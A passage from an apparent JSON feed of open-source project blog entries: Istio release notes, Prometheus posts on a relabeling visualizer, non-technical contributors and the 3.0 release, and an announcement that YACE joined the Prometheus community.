#57530</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <code>sectionName</code> in Gateway API <code>BackendTLSPolicy</code> to enable port-specific TLS configuration. This allows targeting specific ports of a Service by name, enabling different TLS settings per port. For example, you can now configure TLS settings for only the <code>https</code> port of a <code>Service</code> while leaving other ports unaffected.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <code>ServiceEntry</code> as a <code>targetRef</code> in <code>BackendTLSPolicy</code>. This allows users to apply TLS settings to external services defined by <code>ServiceEntry</code> resources.\n(<a href=\"https://github.com/istio/istio/issues/57521\">Issue #57521</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for native nftables when using Istio ambient mode. This update makes it possible to use nftables\ninstead of iptables to manage network rules. To enable the nftables mode, use <code>--set values.global.nativeNftables=true</code> when installing Istio.  (<a href=\"https://github.com/istio/istio/issues/57324\">Issue #57324</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for wildcard hosts in <code>ServiceEntry</code> resources with <code>DYNAMIC_DNS</code> resolution.\nThis is only supported for HTTP traffic for now. It requires ambient mode and a waypoint configured as\nan egress gateway.  (<a href=\"https://github.com/istio/istio/issues/54540\">Issue #54540</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <code>X-Forwarded</code> headers in <code>ProxyConfig.ProxyHeaders</code>.</p>\n</li>\n<li>\n<p><strong>Enabled</strong> waypoints to route traffic to remote networks in ambient multi-cluster.\n(<a href=\"https://github.com/istio/istio/issues/57537\">Issue #57537</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a bug where ztunnel wouldn&rsquo;t correctly use the <code>WorkloadEntry</code> port map when referencing a <code>Service</code> port name.\n(<a href=\"https://github.com/istio/istio/issues/56251\">Issue #56251</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the tag watcher didn&rsquo;t consider the default revision to be the same as the default tag. This would cause issues where Kubernetes gateways wouldn&rsquo;t be programmed.\n(<a href=\"https://github.com/istio/istio/issues/56767\">Issue #56767</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a bug where a shadow <code>Service</code> port number for an <code>InferencePool</code> would start with 543210 instead of 54321. (<a href=\"https://github.com/istio/istio/issues/57472\">Issue #57472</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the ambient dataplane did not correctly handle <code>ServiceEntries</code> with resolution set to <code>NONE</code>. Previously, the configuration would have a VIP but no endpoints, which would result in a &ldquo;no healthy upstream&rdquo; error. This scenario is now configured as a <code>PASSTHROUGH</code> service, meaning the addresses called by the client will be used as the backend.\n(<a href=\"https://github.com/istio/istio/issues/57656\">Issue #57656</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where HTTP/2 connection pool settings were not applied when enabling HTTP/2 upgrades. (<a href=\"https://github.com/istio/istio/issues/57583\">Issue #57583</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> waypoint deployments to use the default Kubernetes <code>terminationGracePeriodSeconds</code> (30 seconds) instead of a hard-coded 2 seconds value.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <code>InferencePool</code> v1.\n(<a href=\"https://github.com/istio/istio/issues/57219\">Issue #57219</a>)</p>\n</li>\n<li>\n<p><strong>Removed</strong> support for <code>InferencePool</code> alpha and release candidate versions.</p>\n</li>\n</ul>\n<h2 id=\"security\">Security</h2>\n<ul>\n<li>\n<p><strong>Improved</strong> root certificate parsing when some certificates were invalid. Istio now filters out malformed certificates instead of rejecting the entire bundle.</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>caCertCredentialName</code> field in <code>ServerTLSSettings</code> to reference a <code>Secret</code>/<code>ConfigMap</code> that holds CA certificates for mTLS.\nSee <a href=\"https://istio.io/docs/tasks/traffic-management/ingress/secure-ingress/#key-formats\">usage</a> or <a href=\"https://istio.io/docs/reference/config/networking/gateway/#ServerTLSSettings-ca_cert_credential_name\">reference</a> for more information.\n(<a href=\"https://github.com/istio/istio/issues/43966\">Issue #43966</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> optional <code>NetworkPolicy</code> deployment for istiod. You can set <code>global.networkPolicy.enabled=true</code> to deploy a default <code>NetworkPolicy</code> for istiod and gateways. We&rsquo;re planning to extend this to later also include <code>NetworkPolicy</code> for istio-cni and ztunnel.\n(<a href=\"https://github.com/istio/api/issues/56877\">Issue #56877</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for configuring <code>seccompProfile</code> in the <code>istio-validation</code> and <code>istio-proxy</code> containers within the sidecar injection template. Users can now set the <code>seccompProfile.type</code> to <code>RuntimeDefault</code> for enhanced security compliance.\n(<a href=\"https://github.com/istio/istio/issues/57004\">Issue #57004</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <code>FrontendTLSValidation</code> (GEP-91) in Gateway API.\nSee <a href=\"https://istio.io/docs/tasks/traffic-management/ingress/secure-ingress/#configure-a-mutual-tls-ingress-gateway\">usage</a> and <a href=\"https://gateway-api.sigs.k8s.io/reference/spec/#frontendtlsvalidation\">reference</a> for more information.\n(<a href=\"https://github.com/istio/istio/issues/43966\">Issue #43966</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> JWT filter configuration to support custom space-delimited claims. The JWT filter configuration now correctly includes user-specified custom space-delimited claims in addition to the default claims (&ldquo;scope&rdquo; and &ldquo;permission&rdquo;). This ensures that the Envoy JWT filter treats these claims as space-delimited strings, allowing for proper validation of JWT tokens that include these claims. To set custom space-delimited claims, use the <code>spaceDelimitedClaims</code> field in the JWT rule configuration inside the <code>RequestAuthentication</code> resource.\n(<a href=\"https://github.com/istio/istio/issues/56873\">Issue #56873</a>)</p>\n</li>\n<li>\n<p><strong>Removed</strong> use of MD5 to optimize comparisons. Istio does not and has not used MD5 for cryptographic purposes. The change is merely to make the code easier to audit and to run in <a href=\"https://go.dev/doc/security/fips140\">FIPS 140-3 mode</a>.</p>\n</li>\n</ul>\n<h2 id=\"telemetry\">Telemetry</h2>\n<ul>\n<li>\n<p><strong>Updated</strong> environment variable <code>PILOT_SPAWN_UPSTREAM_SPAN_FOR_GATEWAY</code> default value to <code>true</code>, enabling the spawning of upstream spans for gateway requests by default.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for annotations <code>sidecar.istio.io/statsFlushInterval</code> and <code>sidecar.istio.io/statsEvictionInterval</code>.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for Zipkin&rsquo;s <code>TraceContextOption</code> configuration to enable dual B3/W3C header propagation.\nConfigure with <code>trace_context_option: USE_B3_WITH_W3C_PROPAGATION</code> in MeshConfig <code>extensionProviders</code> to\nextract B3 headers preferentially, fall back to W3C <code>traceparent</code> headers, and inject both header types\nupstream for better tracing interoperability. See <a href=\"https://www.envoyproxy.io/docs/envoy/latest/api-v3/config/trace/v3/zipkin.proto#envoy-v3-api-enum-config-trace-v3-zipkinconfig-tracecontextoption\">Envoy docs</a> and <a href=\"https://istio.io/docs/reference/config/istio.mesh.v1alpha1/\"><code>MeshConfig</code> reference</a> and <a href=\"https://istio.io/docs/tasks/observability/distributed-tracing/\">usage</a> for more information.</p>\n</li>\n<li>\n<p><strong>Removed</strong> metric expiry support. Use <code>StatsEviction</code> in bootstrap configuration instead.</p>\n</li>\n</ul>\n<h2 id=\"extensibility\">Extensibility</h2>\n<ul>\n<li><strong>Fixed</strong> an issue where <code>EnvoyFilter</code> using <code>targetRef</code> with kind <code>GatewayClass</code> and group <code>gateway.networking.k8s.io</code> in the root namespace was not correctly propagated.</li>\n</ul>\n<h2 id=\"installation\">Installation</h2>\n<ul>\n<li>\n<p><strong>Updated</strong> the istiod helm chart to create <code>EndpointSlice</code> resources instead of <code>Endpoints</code> for remote istiod installs due to <code>Endpoints</code>&rsquo; deprecation as of Kubernetes 1.33.\n(<a href=\"https://github.com/istio/istio/issues/57037\">Issue #57037</a>)</p>\n</li>\n<li>\n<p><strong>Updated</strong> Kiali addon to version v2.17.0.</p>\n</li>\n<li>\n<p><strong>Added</strong> ability to completely null out resource limits or requests in the gateway chart.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for &ldquo;persona-based&rdquo; installations to our Helm charts based on the scope of generated/applied resources.</p>\n<ul>\n<li>If no <code>resourceScope</code> is set, all resources will be installed. This is the same behavior a user would expect from 1.27 charts.</li>\n<li>If <code>resourceScope</code> is set to <code>namespace</code>, only namespace-scoped resources will be installed.</li>\n<li>If <code>resourceScope</code> is set to <code>cluster</code>, only cluster-scoped resources will be installed. This can enable a Kubernetes administrator to manage the resources in the cluster and the mesh administrator to manage the resources in the mesh.\nFor the ztunnel chart, <code>resourceScope</code> is a top-level field. For all other charts, it is a field under <code>global</code>.\n(<a href=\"https://github.com/istio/istio/issues/57530\">Issue #57530</a>)</li>\n</ul>\n</li>\n<li>\n<p><strong>Added</strong> support for the environment variable <code>FORCE_IPTABLES_BINARY</code> to override iptables backend detection and use a specific binary.  (<a href=\"https://github.com/istio/istio/issues/57827\">Issue #57827</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>.Values.podLabels</code> and <code>.Values.daemonSetLabels</code> to istio-cni Helm chart.</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>service.clusterIP</code> configuration to Gateway chart to support overriding the <code>spec.clusterIP</code> of the <code>Service</code> resource. This could be useful in cases where the user wants to set a specific cluster IP for the Gateway service instead of relying on automatic assignment.</p>\n</li>\n<li>\n<p><strong>Added</strong> a new representation of revision tags using cluster IP services, meant to stop using mutating webhooks in ambient mode.\n<code>istioctl tag set &lt;tag&gt; --revision &lt;rev&gt;</code> and the <code>revisionTags</code> Helm value will both create a <code>MutatingWebhook</code> using the current\nspecifications and a <code>Service</code> similar to the istiod <code>Service</code> but including the <code>istio.io/tag</code> label to store the mapping.</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>internalTrafficPolicy</code> option for gateway service (needed, for example when installing ArgoCD with gateway which is an internal application).</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the PDB created by a default installation was blocking the draining of Kubernetes nodes.\n(<a href=\"https://github.com/istio/istio/issues/12602\">Issue #12602</a>)</p>\n</li>\n<li>\n<p><strong>Upgraded</strong> Gateway API support to v1.4. This introduces support for <code>BackendTLSPolicy</code> v1.</p>\n</li>\n</ul>\n<h2 id=\"istioctl\">istioctl</h2>\n<ul>\n<li>\n<p><strong>Added</strong> automatic detection of the default revision in <code>istioctl</code> commands. When <code>--revision</code> is not explicitly specified, the default revision (as configured by <code>istioctl tag set default</code>) will be used automatically.\n(<a href=\"https://github.com/istio/istio/issues/54518\">Issue #54518</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for specifying both <code>--level</code> and <code>--stack-trace-level</code> for <code>istioctl admin log</code>.\n(<a href=\"https://github.com/istio/istio/issues/57007\">Issue #57007</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support specifying the proxy admin port for <code>istioctl experimental authz</code>, <code>istioctl proxystatus</code>, <code>istioctl bug-report</code> and <code>istioctl experimental describe</code> with the flag <code>--proxy-admin-port</code>.</p>\n</li>\n<li>\n<p><strong>Added</strong> flags to support list debug types for <code>istioctl experimental internal-debug</code>.\n(<a href=\"https://github.com/istio/istio/issues/57372\">Issue #57372</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for displaying connection information for <code>istioctl ztunnel-config all</code></p>\n</li>\n<li>\n<p><strong>Fixed</strong> IST0173 analyzer (<code>DestinationRuleSubsetNotSelectPods</code>) incorrectly flagging <code>DestinationRule</code> subsets as not selecting any pods when the subsets used topology labels.</p>\n</li>\n</ul>",

Relabeling rules, while powerful, can be hard to understand and debug. Your rules have to match the expected labels that your service discovery mechanism returns, and getting any step wrong could label your target incorrectly or accidentally drop it.</p>\n<p>To help you figure out where things go wrong (or right), Prometheus 3.8.0 <a href=\"https://github.com/prometheus/prometheus/pull/17337\">just added a relabeling visualizer</a> to the Prometheus server's web UI that allows you to inspect how each relabeling rule is applied to a discovered target's labels. Let's take a look at how it works!</p>\n<h2>Using the relabeling visualizer</h2>\n<p>If you head to any Prometheus server's \"Service discovery\" page (for example: <a href=\"https://demo.promlabs.com/service-discovery\">https://demo.promlabs.com/service-discovery</a>), you will now see a new \"show relabeling\" button for each discovered target:</p>\n<p><img alt=\"Service discovery page screenshot\" src=\"https://prometheus.io/assets/blog/2025-12-02/prometheus-sd-page-show-relabeling.png\" /></p>\n<p>Clicking this button shows you how each relabeling rule is applied to that particular target in sequence:</p>\n<p>The visualizer shows you:</p>\n<ul>\n<li>The <strong>initial labels</strong> of the target as discovered by the service discovery mechanism.</li>\n<li>The details of <strong>each relabeling rule</strong>, including its action type and other parameters.</li>\n<li><strong>How the labels change</strong> after each relabeling rule is applied, with changes, additions, and deletions highlighted in color.</li>\n<li>Whether the target is ultimately <strong>kept or dropped</strong> after all relabeling rules have been applied.</li>\n<li>The <strong>final output labels</strong> of the target if it is kept.</li>\n</ul>\n<p>To debug your relabeling rules, you can now read this diagram from top to bottom and find the exact step where the labels change in an unexpected way or where the target gets dropped. This should help you identify misconfigurations in your relabeling rules more easily.</p>\n<h2>Conclusion</h2>\n<p>The new relabeling visualizer in the Prometheus server's web UI is a powerful tool to help you understand and debug your target relabeling configurations. By providing a step-by-step view of how each relabeling rule affects a target's labels, it makes it easier to identify and fix issues in your setup.

      "summary": "<p>My first introduction to the Prometheus project was through the\n<a href=\"https://mentorship.lfx.linuxfoundation.org/project/36e3f336-ce78-4074-b833-012015eb59be\">Linux Foundation mentorship program</a>,\nwhere I conducted UX research. I remember the anxiety I felt when I was selected as a mentee. I was new not just to Prometheus,\nbut to observability entirely. I worried I was in over my head, working in a heavily developer-focused domain with no development background.</p>\n<p>That anxiety turned out to be unfounded. I went on to make meaningful contributions to the project, and I've learned that what I\nexperienced is nearly universal among non-technical contributors to open source.</p>\n<p>If you're feeling that same uncertainty, this post is for you. I'll share the challenges you're likely to face (or already face),\nwhy your contributions matter, and how to find your place in the Prometheus community.</p>\n<h2>The Challenges Non-Technical Contributors Face</h2>\n<p>As a non-technical contributor, I've had my share of obstacles in open source. And from conversations with others navigating these spaces,\nI've found the struggles are remarkably consistent. Here are the most common barriers:</p>\n<h3>1. The Technical Intimidation Factor</h3>\n<p>I've felt out of place in open source spaces, mostly because technical contributors vastly outnumber non-technical ones. Even the non-technical\npeople often have technical backgrounds or have been around long enough to understand what's happening.</p>\n<p>When every conversation references concepts you don't know, it's easy to feel intimidated. You join meetings and stay silent throughout.\nYou respond in the chat instead of unmuting because you don't trust yourself to speak up in a recorded meeting where everyone else seems\nfluent in a technical language you're still learning.</p>\n<h3>2. Unclear Value Proposition</h3>\n<p>Open source projects rarely spell out their non-technical needs the way a job posting would. You would hardly find an issue titled\n\"Need: someone to interview users and write case studies\" or \"Wanted: community manager to organize monthly meetups.\" Instead, you’re\nmore likely to see a backlog of GitHub issues about bugs, feature requests, and code refactoring.</p>\n<p>Even if you have valuable skills, you don't know where they're needed, how to articulate your value, or whether your contributions will\nbe seen as mission-critical or just nice-to-have. Without a clear sense of how you fit in, it's difficult to reach out confidently.\nYou end up sending vague messages like \"I'd love to help! Let me know if there's anything I can do\", which rarely leads anywhere because\nmaintainers are busy and don't have time to figure out how to match your skills to their needs.</p>\n<h3>3. Lack of Visible Non-Technical Contributors</h3>\n<p>One of the things that draws me to an open source community or project is finding other people like me. I think it's the same way for most people.\nRepresentation matters. It's hard to be what you can't see.</p>\n<p>It’s even more difficult to find non-technical contributors because their contributions are often invisible in the ways projects typically showcase work.\nGitHub contribution graphs count commits. Changelogs list code changes and bug fixes. You only get the \"contributor\" label when you've created a\npull request that got merged. So, even when people are organizing events, supporting users, or conducting research, their work doesn't show up in\nthe same prominent ways code does.</p>\n<h3>4. The Onboarding Gap</h3>\n<p>A typical \"Contributing Guide\" will walk you through setting up a development environment, creating a branch, running tests, and submitting a pull request.\nBut it rarely explains how to contribute documentation improvements, where design feedback should go, or how community support is organized.</p>\n<p>You see \"Join our community\" with a link to a Slack workspace. But between joining and making your first contribution, there's a significant gap.\nThere are hundreds of people in dozens of channels. Who's a maintainer and who's just another community member? Which channel is appropriate for\nyour questions? Who should you tag when you need guidance?</p>\n<h2>Why These Gaps Exist</h2>\n<p>It's worth acknowledging that most of the time, these gaps aren't intentional. Projects don't set out to exclude non-technical contributors or\nmake it harder for them to participate.</p>\n<p>In most cases, a small group of developers build something useful and decide to open-source it. They invite people they know who might need it\n(often other developers) to contribute. The project grows organically within those networks. It becomes a community of developers building\ntools for developers, and certain functions simply don't feel necessary yet. Marketing? The word spreads naturally through tech circles.\nCommunity management? The community is small and self-organizing. UX design? They're developers comfortable with command-line interfaces,\nso they may not fully consider the experience of using a graphical interface.</p>\n<p>None of this is malicious. It's just that the project evolved in a context where those skills weren't obviously needed.</p>\n<p>The shift happens when someone, often a non-technical contributor who sees the potential, steps in and says:\n\"You've built something valuable and grown an impressive community. But here's what you might be missing.\nHere's how documentation could lower the barrier to entry. Here's how community management could retain contributors.\nHere's how user research could guide your roadmap.\"</p>\n<h2>Why Non-Technical Contributions Matter</h2>\n<p>Prometheus is a powerful monitoring system backed by a large community of developers. But like any open source project, it needs more than code to thrive.</p>\n<p><strong>It needs accessible documentation.</strong> From my experience working with engineers, most would rather focus on building than writing docs,\nand understandably so. Engineers who know the system inside out often write documentation that assumes knowledge newcomers don't have.\nWhat makes perfect sense to someone who built the feature can feel impenetrable to someone encountering it for the first time.\nA technical writer testing the product from an end user's perspective, not a builder's, can bridge that gap and lower the barrier to entry.</p>\n<p><strong>It needs organization.</strong> The GitHub issues backlog has hundreds of open items that haven't been triaged. Maintainers spend valuable\ntime parsing what users actually need instead of building solutions. A project manager or someone with triage experience could turn\nthat chaos into a clear roadmap, allowing maintainers to spend their time building solutions.</p>\n<p><strong>It needs community support.</strong> Imagine a user who joins the Slack workspace, excited to contribute. They don't know where to start.\nThey ask a question that gets buried in the stream of messages. They quietly leave. The project just lost a potential contributor because\nno one was there to welcome them and point them in the right direction.</p>\n<p>These are the situations non-technical contributions can help prevent. Good documentation lowers the barrier to entry, which means more adoption,\nmore feedback, and better features. Active community management retains contributors who would otherwise drift away, which means distributed\nknowledge and less maintainer burnout. Organization and triage turn scattered input into actionable priorities.</p>\n<p>The Prometheus maintainers are doing exceptional work building a robust, scalable monitoring system. But they can't do everything,\nand they shouldn't have to. The question now isn't whether non-technical contributions matter. It's whether we create the space for them to happen.</p>\n<h2>Practical Ways You Can Contribute to Prometheus</h2>\n<p>If you're ready to contribute to Prometheus but aren't sure where to start, here are some areas where non-technical skills are actively needed.</p>\n<h3>1. Join the UX Efforts</h3>\n<p>Prometheus is actively working to improve its user experience, and the community now has a\n<a href=\"https://cloud-native.slack.com/archives/C09NL3B1EKW\">UX Working Group</a> dedicated to this effort.</p>\n<p>If you're a UX researcher, designer, or someone with an eye for usability, this is an excellent time to get involved.\nThe working group is still taking shape, with ongoing discussions about priorities and processes.\nJoin the Slack channel to participate in these conversations and watch for upcoming announcements about specific ways to contribute.</p>\n<p>I can tell you from experience that the community is receptive to UX contributions, and your work will have a real impact.</p>\n<h3>2. Write for the Prometheus Blog</h3>\n<p>If you're a technical writer or content creator, the Prometheus blog is a natural entry point. The blog publishes tutorials,\ncase studies, best practices, community updates, and generally, content that helps users get more value from Prometheus.</p>\n<p>Check out the <a href=\"https://github.com/prometheus/docs/blob/main/blog/README.md\">blog content guide</a> to understand what makes a strong blog proposal and how to publish a post on the blog.\nThere's an audience eager to learn from your experience.</p>\n<h3>3. Improve and Maintain Documentation</h3>\n<p>Documentation is one of those perpetual needs in open source. There's always something that could be clearer, more complete, or better organized.\nThe Prometheus docs repo is no exception.</p>\n<p>You can contribute by fixing typos and <a href=\"https://github.com/prometheus/docs/issues/2649\">broken links</a>, expanding getting-started guides,\ncreating tutorials for common monitoring scenarios, or <a href=\"https://www.youtube.com/watch?v=SzSUa5y7Ji0&#x26;t=27105s\">triaging issues</a> to help\nprioritize what needs attention. Even if you don't consider yourself a technical writer, if you've ever been confused by the docs and\nfigured something out, you can help make it clearer for the next person.</p>\n<h3>4. Help Organize PromCon</h3>\n<p><a href=\"https://promcon.io/\">PromCon</a> is Prometheus's annual conference, and it takes significant coordination to pull off.\nThe organizing team handles everything from speaker selection and scheduling to venue logistics and sponsor relationships.</p>\n<p>If you have experience in event planning, sponsor outreach, marketing, or communications, the PromCon organizers would welcome your help.\nReach out to the <a href=\"mailto:promcon-organizers@googlegroups.com\">organizing team</a> or watch for announcements in the Prometheus community channels.</p>\n<h3>5. Advocate and Amplify</h3>\n<p>Finally, one of the simplest but most impactful things you can do is talk about Prometheus. Write blog posts about how you're using Prometheus.\nGive talks at local meetups or conferences. Share tips and learnings on social media. Create video tutorials or live streams.\nRecommend Prometheus to teams evaluating monitoring solutions.</p>\n<p>Every piece of content, every conference talk, every social media post expands Prometheus's reach and helps new users discover it.</p>\n<h2>How to Get Started</h2>\n<p>If you're ready to contribute to Prometheus, here's what I've learned from my own experience navigating the community as a non-technical contributor:</p>\n<p><strong>Start by introducing yourself.</strong> When you join the #prometheus-dev Slack channel, say hello. Slack doesn't always make it obvious\nwhen someone new joins, so if you stay silent, people simply won't know you're there. A simple introduction—your name, what you do, what brought you to Prometheus—is enough to make your presence known.</p>\n<p><strong>Attend community meetings.</strong> Check out the <a href=\"https://prometheus.io/community/#calendar-for-public-events\">community calendar</a> and\nsync the meetings that interest you. Even if you don't understand everything being discussed at first (and that's completely normal), stay.\nThe more you sit in, the more you'll learn about the community's needs and find more opportunities to contribute.</p>\n<p><strong>Observe before you act.</strong> It's tempting to jump in with ideas immediately, but spending time as an observer first pays off.\nRead through Slack discussions and conversations in GitHub issues. Browse the documentation. Notice what kinds of contributions are being made.\nYou'll start to see patterns: recurring questions, documentation gaps, areas where help is needed. That's where your opportunity lies.</p>\n<p><strong>Ask questions.</strong> Everyone was new once. If something isn't clear, ask. If you don't get a response right away,\ngive it some time—people are busy—then follow up. The community is welcoming, but you have to make yourself visible.</p>\n<p>The Prometheus community has room for you. Now you know exactly where to begin.</p>",

      "summary": "<p><a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter\">Yet Another Cloudwatch Exporter</a> (YACE) has officially joined the Prometheus community! This move will make it more accessible to users and open new opportunities for contributors to enhance and maintain the project. There's also a blog post from <a href=\"https://grafana.com/blog/2024/11/19/yace-moves-to-prometheus-community/\">Cristian Greco's point of view</a>.</p>\n<h2>The early days</h2>\n<p>When I first started YACE, I had no idea it would grow to this scale. At the time, I was working with <a href=\"https://www.ivx.com\">Invision AG</a> (not to be confused with the design app), a company focused on workforce management software. They fully supported me in open-sourcing the tool, and with the help of my teammate <a href=\"https://github.com/kforsthoevel\">Kai Forsthövel</a>, YACE was brought to life.</p>\n<p>Our first commit was back in 2018, with one of our primary goals being to make CloudWatch metrics easy to scale and automatically detect what to measure, all while keeping the user experience simple and intuitive. InVision AG was scaling their infrastructure up and down due to machine learning workloads and we needed something that detects new infrastructure easily. This focus on simplicity has remained a core priority. From that point on, YACE began to find its audience.</p>\n<h2>Yace Gains Momentum</h2>\n<p>As YACE expanded, so did the support around it. One pivotal moment was when <a href=\"https://github.com/cristiangreco\">Cristian Greco</a> from Grafana Labs reached out. I was feeling overwhelmed and hardly keeping up when Cristian stepped in, simply asking where he could help. He quickly became the main releaser and led Grafana Labs' contributions to YACE, a turning point that made a huge impact on the project. Along with an incredible community of contributors from all over the world, they elevated YACE beyond what I could have achieved alone, shaping it into a truly global tool. YACE is no longer just my project or Invision's—it belongs to the community.</p>\n<h2>Gratitude and Future Vision</h2>\n<p>I am immensely grateful to every developer, tester, and user who has contributed to YACE's success. This journey has shown me the power of community and open source collaboration. But we're not done yet.</p>\n<p>It's time to take Yace even further—into the heart of the Prometheus ecosystem. Making Yace as the official Amazon CloudWatch exporter for Prometheus will make it easier and more accessible for everyone. With ongoing support from Grafana Labs and my commitment to refining the user experience, we'll ensure YACE becomes an intuitive tool that anyone can use effortlessly.</p>\n<h2>Try out YACE on your own</h2>\n<p>Try out <strong><a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter\">YACE (Yet Another CloudWatch Exporter)</a></strong> by following our step-by-step <a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter/blob/master/docs/installation.md\">Installation Guide</a>.</p>\n<p>You can explore various configuration examples <a href=\"https://github.com/prometheus-community/yet-another-cloudwatch-exporter/tree/master/examples\">here</a> to get started with monitoring specific AWS services.</p>\n<p>Our goal is to enable easy auto-discovery across all AWS services, making it simple to monitor any dynamic infrastructure.</p>",

      "link": "https://prometheus.io/blog/2024/11/14/prometheus-3-0/",
      "published": "2024-11-14T00:00:00.000Z",
      "summary": "<p>Following the recent release of <a href=\"https://prometheus.io/blog/2024/09/11/prometheus-3-beta/\">Prometheus 3.0 beta</a> at PromCon in Berlin, the Prometheus Team\nis excited to announce the immediate availability of Prometheus Version 3.0!</p>\n<p>This latest version marks a significant milestone as it is the first major release in 7 years. Prometheus has come a long way in that time,\nevolving from a project for early adopters to becoming a standard part of the cloud native monitoring stack. Prometheus 3.0 aims to\ncontinue that journey by adding some exciting new features while largely maintaining stability and compatibility with previous versions.</p>\n<p>The full 3.0 release adds some new features on top of the beta and also introduces a few additional breaking changes that we will describe in this article.</p>\n<h2>What's New</h2>\n<p>Here is a summary of the exciting changes that have been released as part of the beta version, as well as what has been added since:</p>\n<h3>New UI</h3>\n<p>One of the highlights in Prometheus 3.0 is its brand-new UI that is enabled by default:</p>\n<p><img alt=\"New UI query page\" src=\"https://prometheus.io/assets/blog/2024-11-14/blog_post_screenshot_tree_view-s.png\" /></p>\n<p>The UI has been completely rewritten with less clutter, a more modern look and feel, new features like a <a href=\"https://promlens.com/\"><strong>PromLens</strong></a>-style tree view,\nand will make future maintenance easier by using a more modern technical stack.</p>\n<p>Learn more about the new UI in general in <a href=\"https://promlabs.com/blog/2024/09/11/a-look-at-the-new-prometheus-3-0-ui/\">Julius' detailed article on the PromLabs blog</a>.\nUsers can temporarily enable the old UI by using the <code>old-ui</code> feature flag.</p>\n<p>Since the new UI is not battle-tested yet, it is also very possible that there are still bugs. If you find any, please\n<a href=\"https://github.com/prometheus/prometheus/issues/new?assignees=&#x26;labels=&#x26;projects=&#x26;template=bug_report.yml\">report them on GitHub</a>.</p>\n<p>Since the beta, the user interface has been updated to support UTF-8 metric and label names.</p>\n<p><img alt=\"New UTF-8 UI\" src=\"https://prometheus.io/assets/blog/2024-11-14/utf8_ui.png\" /></p>\n<h3>Remote Write 2.0</h3>\n<p>Remote-Write 2.0 iterates on the previous protocol version by adding native support for a host of new elements including metadata, exemplars,\ncreated timestamp and native histograms. It also uses string interning to reduce payload size and CPU usage when compressing and decompressing.\nThere is better handling for partial writes to provide more details to clients when this occurs. More details can be found\n<a href=\"https://prometheus.io/docs/specs/remote_write_spec_2_0/\">here</a>.</p>\n<h3>UTF-8 Support</h3>\n<p>Prometheus now allows all valid UTF-8 characters to be used in metric and label names by default, as well as label values,\nas has been true in version 2.x.</p>\n<p>Users will need to make sure their metrics producers are configured to pass UTF-8 names, and if either side does not support UTF-8,\nmetric names will be escaped using the traditional underscore-replacement method. PromQL queries can be written with the new quoting syntax\nin order to retrieve UTF-8 metrics, or users can specify the <code>__name__</code>  label name manually.</p>\n<p>Currently only the Go client library has been updated to support UTF-8, but support for other languages will be added soon.</p>\n<h3>OTLP Support</h3>\n<p>In alignment with <a href=\"https://prometheus.io/blog/2024/03/14/commitment-to-opentelemetry/\">our commitment to OpenTelemetry</a>, Prometheus 3.0 features\nseveral new features to improve interoperability with OpenTelemetry.</p>\n<h4>OTLP Ingestion</h4>\n<p>Prometheus can be configured as a native receiver for the OTLP Metrics protocol, receiving OTLP metrics on the <code>/api/v1/otlp/v1/metrics</code> endpoint.</p>\n<p>See our <a href=\"https://prometheus.io/docs/guides/opentelemetry\">guide</a> on best practices for consuming OTLP metric traffic into Prometheus.</p>\n<h4>UTF-8 Normalization</h4>\n<p>With Prometheus 3.0, thanks to <a href=\"https://prometheus.io/blog/feed.xml#utf-8-support\">UTF-8 support</a>, users can store and query OpenTelemetry metrics without annoying changes to metric and label names like <a href=\"https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/pkg/translator/prometheus\">changing dots to underscores</a>.</p>\n<p>Notably this allows <strong>less confusion</strong> for users and tooling in terms of the discrepancy between what’s defined in OpenTelemetry semantic convention or SDK and what’s actually queryable.</p>\n<p>To achieve this for OTLP ingestion, Prometheus 3.0 has experimental support for different translation strategies. See <a href=\"https://prometheus.io/docs/prometheus/latest/configuration/configuration/#:~:text=Settings%20related%20to%20the%20OTLP%20receiver%20feature\">otlp section in the Prometheus configuration</a> for details.</p>\n<blockquote>\n<p>NOTE: While “NoUTF8EscapingWithSuffixes” strategy allows special characters, it still adds required suffixes for the best experience. See <a href=\"https://github.com/prometheus/proposals/pull/39\">the proposal on the future work to enable no suffixes</a> in Prometheus.</p>\n</blockquote>\n<h3>Native Histograms</h3>\n<p>Native histograms are a Prometheus metric type that offer a higher efficiency and lower cost alternative to Classic Histograms. Rather than having to choose (and potentially have to update) bucket boundaries based on the data set, native histograms have pre-set bucket boundaries based on exponential growth.</p>\n<p>Native Histograms are still experimental and not yet enabled by default, and can be turned on by passing <code>--enable-feature=native-histograms</code>. Some aspects of Native Histograms, like the text format and accessor functions / operators are still under active design.</p>\n<h3>Breaking Changes</h3>\n<p>The Prometheus community strives to <a href=\"https://prometheus.io/docs/prometheus/latest/stability/\">not break existing features within a major release</a>. With a new major release we took the opportunity to clean up a few, but small, long-standing issues. In other words, Prometheus 3.0 contains a few breaking changes. This includes changes to feature flags, configuration files, PromQL, and scrape protocols.</p>\n<p>Please read the <a href=\"https://prometheus.io/docs/prometheus/3.0/migration/\">migration 